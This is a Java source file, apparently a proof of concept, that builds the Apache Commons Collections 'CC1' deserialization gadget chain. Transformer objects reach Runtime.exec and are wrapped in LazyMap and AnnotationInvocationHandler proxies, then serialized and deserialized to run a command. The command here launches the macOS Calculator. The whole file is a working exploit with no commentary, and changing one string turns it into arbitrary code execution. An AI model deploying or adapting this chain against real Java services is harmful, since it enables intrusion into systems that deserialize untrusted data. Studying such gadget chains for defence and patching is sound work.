package com.reflect;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class cc1test {
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
        final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);

        final Map testMap = new HashMap();

        Map evilMap = (Map) Proxy.newProxyInstance(
                testMap.getClass().getClassLoader(),
                testMap.getClass().getInterfaces(),
                secondInvocationHandler
        );
        final Constructor<?> ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
        byte[] serializeData=serialize(handler);
        unserialize(serializeData);
    }
}

